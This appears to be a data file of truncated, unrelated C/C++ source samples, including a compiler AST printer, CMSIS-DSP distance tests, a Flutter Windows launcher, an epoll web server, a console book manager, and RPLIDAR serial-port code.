Output.AddFormat( \"<class> '%s' %d\\n\", (const char*)GetSymbolName(pNode->pSymbol), pNode->pSymbol->StorageSize ); break;\r\n\r\n        case ast_class_fielddef:\r\n            Output.AddFormat( \"<class_fielddef> '%s %s' %d %d\\n\", (const char*)GetSymbolName(pNode->Type.pType), (const char*)GetSymbolName(pNode->pSymbol), pNode->pSymbol->StorageOffset, pNode->pSymbol->StorageSize ); break;\r\n\r\n        case ast_class_methoddef:\r\n            {\r\n                Output.AddFormat( \"<class_methoddef> '%s %s' %d %d\\n\", (const char*)GetSymbolName(pNode->Type.pType), (const char*)GetSymbolName(pNode->pSymbol), pNode->pSymbol->StorageOffset, pNode->pSymbol->StorageSize );\r\n                for( s32 i=0 ; i<pNode->pSymbol->pChildScope->GetNumSymbols() ; i++ )\r\n                {\r\n                    xsc_symbol* pArg = pNode->pSymbol->pChildScope->GetSymbol(i);\r\n                    { for( s32 j=0 ; j<Indent ; j++ ) Output.AddFormat( \" \" ); }\r\n                    Output.AddFormat( \"                  '%s %s' %d %d\\n\",  (const char*)GetSymbolName(pArg->Type.pType), (const char*)GetSymbolName(pArg), pArg->StorageOffset, pArg->StorageSize );\r\n                }\r\n                break;\r\n            }\r\n\r\n        case ast_var_defs:\r\n            Output.AddFormat( \"<var_defs>\\n\" ); break;\r\n\r\n        case ast_var_def:\r\n            Output.AddFormat( \"<var_def> '%s %s' %d %d\\n\", (const char*)GetSymbolName(pNode->pSymbol->Type.pType), (const char*)GetSymbolName(pNode->pS",
    "#include \"DistanceTestsF32.h\"\n#include <stdio.h>\n#include \"Error.h\"\n#include \"arm_math.h\"\n#include \"Test.h\"\n\n\n\n    void DistanceTestsF32::test_braycurtis_distance_f32()\n    {\n       const float32_t *inpA = inputA.ptr();\n       const float32_t *inpB = inputB.ptr();\n\n       float32_t *outp = output.ptr();\n       \n       for(int i=0; i < this->nbPatterns ; i ++)\n       {\n          *outp = arm_braycurtis_distance_f32(inpA, inpB, this->vecDim);\n         \n          inpA += this->vecDim;\n          inpB += this->vecDim;\n          outp ++;\n       }\n\n        ASSERT_NEAR_EQ(output,ref,(float32_t)1e-3);\n    } \n \n    void DistanceTestsF32::test_canberra_distance_f32()\n    {\n       const float32_t *inpA = inputA.ptr();\n       const float32_t *inpB = inputB.ptr();\n\n       float32_t *outp = output.ptr();\n       \n       for(int i=0; i < this->nbPatterns ; i ++)\n       {\n          *outp = arm_canberra_distance_f32(inpA, inpB, this->vecDim);\n         \n          inpA += this->vecDim;\n          inpB += this->vecDim;\n          outp ++;\n       }\n\n        ASSERT_NEAR_EQ(output,ref,(float32_t)1e-3);\n    } \n\n    void DistanceTestsF32::test_chebyshev_distance_f32()\n    {\n       const float32_t *inpA = inputA.ptr();\n       const float32_t *inpB = inputB.ptr();\n\n       float32_t *outp = output.ptr();\n       \n       for(int i=0; i < this->nbPatterns ; i ++)\n       {\n          *outp = arm_chebyshev_distance_f32(inpA, inpB, this->vecDim);\n         \n          inpA += this->vecDim;\n          inpB += this->vecDim;\n          outp ++;\n       }\n\n        ASSERT_NEAR_EQ(output,ref,(float32_t)1e-3);\n    } \n\n    void DistanceTestsF32::test_cityblock_distance_f32()\n    {\n       const float32_t *inpA = inputA.ptr();\n       const float32_t *inpB = inputB.ptr();\n\n       float32_t *outp = output.ptr();\n       \n       for(int i=0; i < this->nbPatterns ; i ++)\n       {\n          *outp = arm_cityblock_distance_f32(inpA, inpB, this->vecDim);\n         \n          inpA += this->vecDim;\n          inpB += this->vecDim;\n          outp ++;\n       }\n\n        ASSERT_NEAR_EQ(output,ref,(float32_t)1e-3);\n    } \n\n    void DistanceTestsF32::test_correlation_distance_f32()\n    {\n       const float32_t *inpA = inputA.ptr();\n       const float32_t *inpB = inputB.ptr();\n\n       float32_t *tmpap = tmpA.ptr();\n       float32_t *tmpbp = tmpB.ptr();\n\n       float32_t *outp = output.ptr();\n       \n       for(int i=0; i < this->nbPatterns ; i ++)\n       {\n          memcpy(tmpap, inpA, sizeof(float32_t) * this->vecDim);\n          memcpy(tmpbp, inpB, sizeof(float32_t) * this->vecDim);\n          \n          *outp = arm_correlation_distance_f32(tmpap, tmpbp, this->vecDim);\n         \n          inpA += this->vecDim;\n          inpB += this->vecDim;\n          outp ++;\n       }\n\n        ASSERT_NEAR_EQ(output,ref,(float32_t)1e-3);\n    } \n\n    void DistanceTestsF32::test_cosine_distance_f32()\n    {\n       const float32_t *inpA = inputA.ptr();\n       const float32_t *inpB = inputB.ptr();\n\n       float32_t *outp = output.ptr();\n       \n       for(int i=0; i < this->nbPatterns ; i ++)\n       {\n          *outp = arm_cosine_distance_f32(inpA, inpB, this->vecDim);\n         \n          inpA += this->vecDim;\n          inpB += this->vecDim;\n          outp ++;\n       }\n\n        ASSERT_NEAR_EQ(output,ref,(float32_t)1e-3);\n    } \n\n    void DistanceTestsF32::test_euclidean_distance_f32()\n    {\n       const float32_t *inpA = inputA.ptr();\n       const float32_t *inpB = inputB.ptr();\n\n       float32_t *outp = output.ptr();\n       \n       for(int i=0; i < this->nbPatterns ; i ++)\n       {\n          *outp = arm_euclidean_distance_f32(inpA, inpB, this->vecDim);\n         \n          inpA += this->vecDim;\n          inpB += this->vecDim;\n          outp ++;\n       }\n\n        ASSERT_NEAR_EQ(output,ref,(float32_t)1e-3);\n    } \n\n    void DistanceTestsF32::test_jensenshannon_distance_f32()\n    {\n       const float32_t *inpA = inputA.ptr();\n       const float32_t *inpB = inputB.ptr();\n\n       float32_t *outp = output.ptr();\n\n      \n       \n       for(int i=0; i < this->nbPatterns ; i ++)\n       {\n          *outp = arm_jensenshannon_distance_f32(inpA, inpB, this->vecDim);\n         \n          inpA += this->vecDim;\n          inpB += this->vecDim;\n          outp ++;\n       }\n\n        ASSERT_NEAR_EQ(output,ref,(float32_t)1e-3);\n    } \n\n    void DistanceTestsF32::test_minkowski_distance_f32()\n    {\n       const float32_t *inpA = inputA.ptr();\n       const float32_t *inpB = inputB.ptr();\n       const int16_t   *dimsp= dims.ptr();\n       dimsp += 2;\n\n       float32_t *outp = output.ptr();\n       \n       for(int i=0; i < this->nbPatterns ; i ++)\n       {\n          *outp = arm_minkowski_distance_f32(inpA, inpB, *dimsp,this->vecDim);\n         \n          inpA += this->vecDim;\n          inpB += this->vecDim;\n          outp ++;\n          dimsp ++;\n       }\n\n        ASSERT_NEAR_EQ(output,ref,(float32_t)1e-3);\n    } \n  \n  \n    void DistanceTestsF32::setUp(Testing::testID_t id,std::vector<Testing::param_t>& paramsArgs,Client::PatternMgr",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"ticket_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"webserver.h\"\n\nusing namespace std;\n\nWebServer::WebServer(\n\tint port, int trigMode,\n\tint connPoolNum, int threadNum) :\n\tport_(port), isClose_(false),\n\tthreadpool_(new ThreadPool(threadNum)), epoller_(new Epoller())\n{\n\tstrcpy(srcDir_, \"/home/dzy/projects/webserver/resources/\");\n    cout<<srcDir_<<endl;\n    //strncat(srcDir_, \"/resources\", 16);\n\tHttpConn::userCount = 0;\n\tHttpConn::srcDir = srcDir_;\n\n\tInitEventMode_(trigMode);//\u8bbe\u7f6eET\u6a21\u5f0f\n    //\u521d\u59cb\u5316\u5957\u63a5\u5b57\n    if(!InitSocket_()) { isClose_ = true;}\n}\n\nWebServer::~WebServer() {\n    close(listenFd_);\n    isClose_ = true;\n    free(srcDir_);\n}\n\nvoid WebServer::_Start() {\n    int timeMS = -1;  /* epoll wait\u7684timeout == -1 \u65e0\u4e8b\u4ef6\u5c06\u963b\u585e */\n    if(!isClose_) { cout << \"========== Server start ==========\"<<endl; }\n    while(!isClose_) {\n        int eventCnt = epoller_->Wait(timeMS);//\u8fd4\u56de\u503c\u662f \u68c0\u6d4b\u5230\u6709\u591a\u5c11\u4e2a\u4e8b\u4ef6\u53d1\u751f \n        //cout<<\"eventCnt:\"<<eventCnt<<endl;\n        for(int i = 0; i < eventCnt; i++) {\n            /* \u5904\u7406\u4e8b\u4ef6 */\n            int fd = epoller_->GetEventFd(i); \n            uint32_t events = epoller_->GetEvents(i);\n            \n            cout<<\"\u5224\u65ad\u4e8b\u4ef6\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\"<<endl;\n            if(fd == listenFd_) {\n                DealListen_();\n            }\n            else if(events & (EPOLLRDHUP | EPOLLHUP | EPOLLERR)) {\n                assert(users_.count(fd) > 0);\n                CloseConn_(&users_[fd]);\n            }\n            else if(events & EPOLLIN) { \n                assert(users_.count(fd) > 0);\n                DealRead_(&users_[fd]);\n            }\n            else if(events & EPOLLOUT) { \n                assert(users_.count(fd) > 0);\n                DealWrite_(&users_[fd]);\n            } \n            else {\n                cout<<\"Unexpected event\"<<endl;\n            }\n        }\n    }\n}\n\n/* Create listenFd */\nbool WebServer::InitSocket_() {\n    struct sockaddr_in addr;\n    if(port_ > 65535 || port_ < 1024) {\n        cout<<\"Port:\"<<port_<<\"error!\"<<endl;\n        return false;\n    }\n    addr.sin_family = AF_INET;\n    addr.sin_addr.s_addr = htonl(INADDR_ANY);\n    addr.sin_port = htons(port_); \n\n    listenFd_ = socket(AF_INET, SOCK_STREAM, 0);\n    if(listenFd_ < 0) {\n        cout<<\"Create socket error!\"<<\" \"<<port_<<endl;\n        return false;\n    }\n\n    int ret;\n    int optval = 1;\n    /* \u7aef\u53e3\u590d\u7528 */\n    /* \u53ea\u6709\u6700\u540e\u4e00\u4e2a\u5957\u63a5\u5b57\u4f1a\u6b63\u5e38\u63a5\u6536\u6570\u636e\u3002 */\n    ret = setsockopt(listenFd_, SOL_SOCKET, SO_REUSEADDR, (const void*)&optval, sizeof(int)); //\u8bbe\u7f6e\u7aef\u53e3\u590d\u7528\n    if(ret == -1) {\n        cout<<\"set socket setsockopt error !\"<<endl;\n        close(listenFd_);\n        return false;\n    }\n\n    ret = bind(listenFd_, (struct sockaddr *)&addr, sizeof(addr));\n    if(ret < 0) {\n        cout<<\"Bind Port:\"<<port_<<\"error!\"<<endl;\n        close(listenFd_);\n        return false;\n    }\n\n    ret = listen(listenFd_, 6);\n    if(ret < 0) {\n        cout<<\"Listen Port:\"<<port_<<\"error!\"<<endl;\n        close(listenFd_);\n        return false;\n    }\n\n    ret = epoller_->AddFd(listenFd_,  listenEvent_ | EPOLLIN); //\u8bfb\n    if(ret == 0) { \n        cout<<\"Add listen error!\"<<endl;\n        close(listenFd_);\n        return false;\n    }\n\n    SetFdNonblock(listenFd_); //\u8bbe\u7f6e\u6587\u4ef6\u63cf\u8ff0\u7b26\u975e\u963b\u585e\uff08epoll\uff09\n    cout<<\"Server Port:\"<<port_<<endl;\n    return true;\n}\n\nvoid WebServer::InitEventMode_(int trigMode) {\n\tlistenEvent_ = EPOLLRDHUP;\n\tconnEvent_ = EPOLLONESHOT | EPOLLRDHUP;\n\tswitch (trigMode)\n\t{\n\tcase 0:\n\t\tbreak;\n\tcase 1:\n\t\tconnEvent_ |= EPOLLET;\n\t\tbreak;\n\tcase 2:\n\t\tlistenEvent_ |= EPOLLET;\n\t\tbreak;\n\tcase 3:\n\t\tlistenEvent_ |= EPOLLET;\n\t\tconnEvent_ |= EPOLLET;\n\t\tbreak;\n\tdefault:\n\t\tlistenEvent_ |= EPOLLET;\n\t\tconnEvent_ |= EPOLLET;\n\t\tbreak;\n\t}\n\tHttpConn::isET = (connEvent_ & EPOLLET);\n}\n\nvoid WebServer::AddClient_(int fd, sockaddr_in addr) {\n    assert(fd > 0);\n    users_[fd].init(fd, addr);//\u7528\u6237\u6570\u52a0\u4e00\uff0c\u5730\u5740\uff0c\u6587\u4ef6\u63cf\u8ff0\u7b26\uff0c\u68c0\u67e5\u7f13\u51b2\u533a...\n    epoller_->AddFd(fd, EPOLLIN | connEvent_); //\u5411epoll\u4e2d\u6dfb\u52a0\u8fde\u63a5\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\uff08\u8bfb\u4e8b\u4ef6\uff09\n    SetFdNonblock(fd); \n    cout<<\"AddClient_ \"<<users_[fd].GetFd() <<\" in!\"<<endl;\n}\n\nvoid WebServer::DealListen_() {\n    cout<<\"\u5f00\u59cb\u5904\u7406\u76d1\u542c\"<<endl;\n    struct sockaddr_in addr; \n    socklen_t len = sizeof(addr);\n    do {\n        int fd = accept(listenFd_, (struct sockaddr *)&addr, &len);\n        if(fd <= 0) { return;} //\n        else if(HttpConn::userCount >= MAX_FD) {\n            SendError_(fd, \"Server busy!\");\n            cout<<\"Clients is full!\"<<endl;\n            return;\n        }\n        AddClient_(fd, addr); //\u6dfb\u52a0\u5ba2\u6237\u7aef\n    } while(listenEvent_ & EPOLLET); //ET\u6a21\u5f0f \n}\n\nvoid WebServer::DealRead_(HttpConn* client) {\n    cout<<\"\u5f00\u59cb\u5904\u7406\u8bfb\u4e8b\u4ef6\"<<endl;\n    assert(client);\n    //\u7531\u7ebf\u7a0b\u6c60\u4e2d\u7684\u5de5\u4f5c\u7ebf\u7a0b\u5904\u7406\u4e8b\u4ef6\u2014\u2014\u2014\u2014Reactor\u6a21\u5f0f\n    threadpool_->AddTask(std::bind(&WebServer::OnRead_, this, client)); //\u8bfb\u4e8b\u4ef6\n}\n\nvoid WebServer::DealWrite_(HttpConn* client) {\n    cout<<\"\u5f00\u59cb\u5904\u7406\u5199\u4e8b\u4ef6\"<<endl;\n    assert(client);\n    //\u7531\u7ebf\u7a0b\u6c60\u4e2d\u7684\u5de5\u4f5c\u7ebf\u7a0b\u5904\u7406\u4e8b\u4ef6\u2014\u2014\u2014\u2014Reactor\u6a21\u5f0f\n    threadpool_->AddTask(std::bind(&WebServer::OnWrite_, this, client)); //\u5199\u4e8b\u4ef6\n}\n\nvoid WebServer::SendError_(int fd, const char*info) {\n    assert(fd > 0);\n    int ret = send(fd, info, strlen(info), 0);\n    if(ret < 0) {\n        cout<<\"send error to client\"<<fd<<\" error!\"<<endl;\n    }\n    close(fd",
    "#include <iostream>\r\n#include <cstring>\r\n#include <cstdlib>\r\n#include <windows.h>\r\n#define size 200\r\nusing namespace std;\r\n\r\n//int MAX_BOOKS = 100;\r\n\r\nclass Book {\r\npublic:\r\n    int ISBN;\r\n    string Title;\r\n    string Author;\r\n    string Genre;\r\n    int Pages;\r\n\r\n    Book() = default;\r\n\r\n   Book(int isbn, string title, string author, string genre, int pages) \r\n  : ISBN(isbn), Title(title), Author(author), Genre(genre), Pages(pages){}\r\n  \r\n  \r\n\r\n\r\n};\r\n\r\nvoid AddBook(Book books[], int &bookCount);\r\nvoid RemoveBook(Book books[], int &bookCount);\r\nvoid SearchBook(const Book books[], int bookCount);\r\nvoid UpdateBookData(Book books[], int bookCount);\r\nvoid DisplayAllBooks(const Book books[], int bookCount);\r\nvoid AlreadyStore(Book books[], int &bookCount);\r\nvoid Messenger(const Book books[], int bookCount);\r\n\r\nint main() {\r\n    system(\"color 9F\");\r\n    Book books[size];\r\n    int bookCount = 0;\r\n    int choice;\r\n\r\n    AlreadyStore(books, bookCount);\r\n\r\n    do {\r\n        cout << \"\\n\\t\\t\\t**>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\\n\";\r\n        cout << \"\\t\\t\\t* Book Management System Menu *\\n\";\r\n        cout << \"\\t\\t\\t>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>**\\n\\n\";\r\n        cout << \"\\t\\t\\t1. Add Book\\n\";\r\n        cout << \"\\t\\t\\t2. Display All Books\\n\";\r\n        cout << \"\\t\\t\\t3. Remove Book\\n\";\r\n        cout << \"\\t\\t\\t4. Search Book\\n\";\r\n        cout << \"\\t\\t\\t5. Update Book Data\\n\";\r\n        cout << \"\\t\\t\\t6. Exit\\n\\n\";\r\n        cout << \"\\t\\t\\tEnter your choice: \";\r\n        cin >> choice;\r\n\r\n        switch (choice) {\r\n            case 1:\r\n                AddBook(books, bookCount);\r\n                break;\r\n            case 2:\r\n                DisplayAllBooks(books, bookCount);\r\n                break;\r\n            case 3:\r\n                RemoveBook(books, bookCount);\r\n                break;\r\n            case 4:\r\n                SearchBook(books, bookCount);\r\n                break;\r\n            case 5:\r\n                UpdateBookData(books, bookCount);\r\n                break;\r\n            case 6:\r\n                cout << \"\\t\\t\\tTHANKS FOR VISITING.\\n\";\r\n                break;\r\n            default:\r\n                cout << \"\\t\\t\\tInvalid choice. Please try again.\\n\";\r\n        }\r\n    } while (choice != 7);\r\n\r\n    return 0;\r\n}\r\n\r\nvoid AlreadyStore(Book books[], int &bookCount)\r\n {\r\n    if (bookCount + 5 <=size) {\r\n        books[bookCount++] = Book(4563, \"The Guide\", \"R.K. NARAYAN \", \" Sort Story \", 328);\r\n        books[bookCount++] = Book(758, \"Broken Republic \", \"ARUNDHATI ROY\", \"  Criminal  \", 332);\r\n        books[bookCount++] = Book(75896, \"The Swap\", \"Shuma Raha   \", \"Girls thises\", 281);\r\n        books[bookCount++] = Book(9781, \"Bhagwat Gita\", \" acharay     \", \"  Historic  \", 700);\r\n        books[bookCount++] = Book(97800, \"mind crack\", \"diljith sonii\", \"   magic    \", 277);\r\n        //books[bookCount++] = Book(9780, \"The Lord of the Rings\", \"J.R.R. Tolkien\", \"Fantasy\", 1178);\r\n    }\r\n}\r\n\r\nvoid DisplayAllBooks(const Book books[], int bookCount)\r\n {\r\n    if (bookCount == 0) {\r\n        cout << \"\\t\\t\\tBook database is empty. No books to display.\\n\";\r\n        return;\r\n    }\r\n\r\n    printf(\"\\n\");\r\n    printf(\"\\t\\t\\t+---------------+---------------------+---------------+--------------+-----------------+\\n\");\r\n    printf(\"\\t\\t\\t|     ISBN      |       Title         |   Author      |  Types       |    Pages        |\\n\");\r\n    printf(\"\\t\\t\\t+---------------+---------------------+---------------+--------------+-----------------+\\n\");\r\n\r\n    for (int i = 0; i < bookCount; i++) \r\n\t{\r\n        printf(\"\\t\\t\\t| %-13d | %-19s | %-10s | %-7s | %-15d |\\n\",\r\n               books[i].ISBN, books[i].Title.c_str(), books[i].Author.c_str(), books[i].Genre.c_str(), books[i].Pages);\r\n    }\r\n\r\n     printf(\"\\t\\t\\t+---------------+---------------------+---------------+--------------+-----------------+\\n\");\r\n\r\n}\r\n\r\nvoid AddBook(Book books[], int &bookCount) \r\n{\r\n    if (bookCount >= size) {\r\n        cout << \"\\t\\t\\tBook database is full. Cannot add more books.\\n\";\r\n        return;\r\n    }\r\n\r\n    Book newBook;\r\n    cout << \"\\t\\t\\tEnter ISBN: \";\r\n    cin >> newBook.ISBN;\r\n    cout << \"\\t\\t\\tEnter Title: \";\r\n    cin.ignore();\r\n    getline(cin, newBook.Title);\r\n    cout << \"\\t\\t\\tEnter Author: \";\r\n    getline(cin, newBook.Author);\r\n    cout << \"\\t\\t\\tEnter types: \";\r\n    getline(cin, newBook.Genre);\r\n    cout << \"\\t\\t\\tEnter Pages: \";\r\n    cin >> newBook.Pages;\r\n\r\n    books[bookCount++] = newBook;\r\n    cout << \"\\t\\t\\tBook added successfully.\\n\";\r\n}\r\n\r\nvoid RemoveBook(Book books[], int &bookCount) {\r\n    if (bookCount == 0) {\r\n        cout << \"\\t\\t\\tBook database is empty. Cannot remove a book.\\n\";\r\n        return;\r\n    }\r\n\r\n    int choice;\r\n    cout << \"\\t\\t\\tHow would you like to remove the book?\\n\";\r\n    cout << \"\\t\\t\\t1. Remove by ISBN\\n\";\r\n    cout << \"\\t\\t\\t2. Remove by Title\\n\";\r\n    cout << \"\\t\\t\\tEnter your choice: \";\r\n    cin >> choice;\r\n\r\n    if (choice == 1) {\r\n        int ISBNToRemove;\r\n        cout << \"\\t\\t\\tEnter the ISBN of the book you want to remov",
    "#include \"../include/agx.hpp\"\n\nAGX::AGX()\n{\n    this->AGXid = \"AGX Xavier\";\n    this->AI = \"32 TOPS\";\n    this->CUDAcore = \"512\";\n    this->TensorCore = \"64\";\n    this->RDD = \"32\";\n    this->store = \"32\";\n}\n\nvoid AGX::set()\n{\n    cout << \"\u8bbe\u7f6eAGX\u5957\u4ef6\u578b\u53f7: \" << endl;\n    cin >> this->AGXid;\n    cout << \"\u8bbe\u7f6eAI\u7b97\u529b: \" << endl;\n    cin >> this->AI;\n    cout << \"\u8bbe\u7f6eCUDA\u6838\u5fc3\u6570: \" << endl;\n    cin >> this->CUDAcore;\n    cout << \"\u8bbe\u7f6eTensorCore\u6570: \" << endl;\n    cin >> this->TensorCore;\n    cout << \"\u8bbe\u7f6e\u663e\u5b58\u5bb9\u91cf: \" << endl;\n    cin >> this->RDD;\n    cout << \"\u8bbe\u7f6e\u5b58\u50a8\u5bb9\u91cf: \" << endl;\n    cin >> this->store;\n}\n\nvoid AGX::print()\n{\n    cout << \"\\033[1mAGX\u5957\u4ef6\u578b\u53f7: \\033[0m\" << this->AGXid << endl;\n    cout << \"\\033[1mAI\u7b97\u529b: \\033[0m\" << this->AI << endl;\n    cout << \"\\033[1mCUDA\u6838\u5fc3\u6570: \\033[0m\" << this->CUDAcore << endl;\n    cout << \"\\033[1mTensorCore\u6570: \\033[0m\" << this->TensorCore << endl;\n    cout << \"\\033[1m\u663e\u5b58\u5bb9\u91cf: \\033[0m\" << this->RDD << \" GB\" << endl;\n    cout << \"\\033[1m\u5b58\u50a8\u5bb9\u91cf: \\033[0m\" << this->store << \" GB\" << endl;\n}\n\n// Setter and Getter implementations\nvoid AGX::setAGXid(string AGXid) { this->AGXid = AGXid; }\nvoid AGX::setAI(string AI) { this->AI = AI; }\nvoid AGX::setCUDAcore(string CUDAcore) { this->CUDAcore = CUDAcore; }\nvoid AGX::setTensorCore(string TensorCore) { this->TensorCore = TensorCore; }\nvoid AGX::setRDD(string RDD) { this->RDD = RDD; }\nvoid AGX::setStore(string store) { this->store = store; }\n\nstring AGX::getAGXid() { return this->AGXid; }\nstring AGX::getAI() { return this->AI; }\nstring AGX::getCUDAcore() { return this->CUDAcore; }\nstring AGX::getTensorCore() { return this->TensorCore; }\nstring AGX::getRDD() { return this->RDD; }\nstring AGX::getStore() { return this->store; }\n",
    "/*\n *  RPLIDAR SDK\n *\n *  Copyright (c) 2009 - 2014 RoboPeak Team\n *  http://www.robopeak.com\n *  Copyright (c) 2014 - 2018 Shanghai Slamtec Co., Ltd.\n *  http://www.slamtec.com\n *\n */\n/*\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are met:\n *\n * 1. Redistributions of source code must retain the above copyright notice,\n *    this list of conditions and the following disclaimer.\n *\n * 2. Redistributions in binary form must reproduce the above copyright notice,\n *    this list of conditions and the following disclaimer in the documentation\n *    and/or other materials provided with the distribution.\n *\n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO,\n * THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR\n * PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR\n * CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,\n * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,\n * PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;\n * OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR\n * OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,\n * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n *\n */\n\n#include \"sdkcommon.h\"\n#include \"net_serial.h\"\n\nnamespace rp{ namespace arch{ namespace net{\n\nraw_serial::raw_serial()\n    : rp::hal::serial_rxtx()\n    , _serial_handle(NULL)\n    , _baudrate(0)\n    , _flags(0)\n{\n    _init();\n}\n\nraw_serial::~raw_serial()\n{\n    close();\n\n    CloseHandle(_ro.hEvent);\n    CloseHandle(_wo.hEvent);\n    CloseHandle(_wait_o.hEvent);\n}\n\nbool raw_serial::open()\n{\n    return open(_portName, _baudrate, _flags);\n}\n\nbool raw_serial::bind(const char * portname, _u32 baudrate, _u32 flags)\n{   \n    strncpy(_portName, portname, sizeof(_portName));\n    _baudrate = baudrate;\n    _flags    = flags;\n    return true;\n}\n\nbool raw_serial::open(const char * portname, _u32 baudrate, _u32 flags)\n{\n    if (isOpened()) close();\n    \n    _serial_handle = CreateFile(\n        portname,\n        GENERIC_READ | GENERIC_WRITE,\n        0,\n        NULL,\n        OPEN_EXISTING,\n        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,\n        NULL\n        );\n\n    if (_serial_handle == INVALID_HANDLE_VALUE) return false;\n\n    if (!SetupComm(_serial_handle, SERIAL_RX_BUFFER_SIZE, SERIAL_TX_BUFFER_SIZE))\n    {\n        close();\n        return false;\n    }\n    \n    _dcb.BaudRate = baudrate;\n    _dcb.ByteSize = 8;\n    _dcb.Parity   = NOPARITY;\n    _dcb.StopBits = ONESTOPBIT;\n    _dcb.fDtrControl = DTR_CONTROL_ENABLE;\n\n    if (!SetCommState(_serial_handle, &_dcb))\n    {\n        close();\n        return false;\n    }\n\n    if (!SetCommTimeouts(_serial_handle, &_co))\n    {\n        close();\n        return false;\n    }\n\n    if (!SetCommMask(_serial_handle, EV_RXCHAR | EV_ERR ))\n    {\n        close();\n        return false;\n    }\n\n    if (!PurgeComm(_serial_handle, PURGE_TXABORT | PURGE_RXABORT | PURGE_TXCLEAR | PURGE_RXCLEAR ))\n    {\n        close();\n        return false;\n    }\n\n    Sleep(30); \n    _is_serial_opened = true;\n\n    //Clear the DTR bit set DTR=high\n    clearDTR();\n\n    return true;\n}\n\nvoid raw_serial::close()\n{\n    SetCommMask(_serial_handle, 0);\n    ResetEvent(_wait_o.hEvent);\n\n    CloseHandle(_serial_handle);\n    _serial_handle = INVALID_HANDLE_VALUE;\n    \n    _is_serial_opened = false;\n}\n\nint raw_serial::senddata(const unsigned char * data, size_t size)\n{\n    DWORD    error;\n    DWORD w_len = 0, o_len = -1;\n    if (!isOpened()) return ANS_DEV_ERR;\n\n    if (data == NULL || size ==0) return 0;\n    \n    if(ClearCommError(_serial_handle, &error, NULL) && error > 0)\n        PurgeComm(_serial_handle, PURGE_TXABORT | PURGE_TXCLEAR);\n\n    if(!WriteFile(_serial_handle, data, size, &w_len, &_wo))\n        if(GetLastError() != ERROR_IO_PENDING)\n            w_len = ANS_DEV_ERR;\n\n    return w_len;\n}\n\nint raw_serial::recvdata(unsigned char * data, size_t size)\n{\n    if (!isOpened()) return 0;\n    DWORD r_len = 0;\n\n\n    if(!ReadFile(_serial_handle, data, size, &r_len, &_ro))\n    {\n        if(GetLastError() == ERROR_IO_PENDING) \n        {\n            if(!GetOverlappedResult(_serial_handle, &_ro, &r_len, FALSE))\n            {\n                if(GetLastError() != ERROR_IO_INCOMPLETE)\n                    r_len = 0;\n            }\n        }\n        else\n            r_len = 0;\n    }\n\n    return r_len;\n}\n\nvoid raw_serial::flush( _u32 flags)\n{\n    PurgeComm(_serial_handle, PURGE_TXABORT | PURGE_RXABORT | PURGE_TXCLEAR | PURGE_RXCLEAR );\n}\n\nint raw_serial::waitforsent(_u32 timeout, size_t * returned_size)\n{\n    if (!isOpened() ) return ANS_DEV_ERR;\n    DWORD w_len = 0;\n    _word_size_t ans =0;\n\n    if (WaitForSingleObject(_wo.hEvent, timeout) == WAIT_TIMEOUT)\n    {\n     ",
    "#include \"gamewindowlabel.h\"\r\n#include \"gamewidget.h\"\r\n\r\n\r\n/**\r\n * @brief Constructor for GameWindowLabel class, initializing game parameters, UI settings, and timers.\r\n * @param parent The parent widget of GameWindowLabel, typically a GameWidget instance.\r\n */\r\nGameWindowLabel::GameWindowLabel(QWidget *parent) : QLabel(parent)\r\n{\r\n\r\n    level = 1;\r\n    score = 0;\r\n    rightCnt = wrongCnt = 0;\r\n\r\n    cannonLen = 220;\r\n    lockedWord = NULL;\r\n    begin = false;\r\n    // emit gameStatusChanged(begin);\r\n    isPaused = false;\r\n    showPauseMessage = true;\r\n    showStudyMessage = true;\r\n\r\n    // controlling the blink effect of pause notices\r\n    blinkTimer = new QTimer(this);\r\n    connect(blinkTimer, &QTimer::timeout, this, &GameWindowLabel::toggleMessages);\r\n\r\n    blinkTimer->setInterval(1000);\r\n\r\n    // ====================================Generating dropping words============================================\r\n\r\n    // // 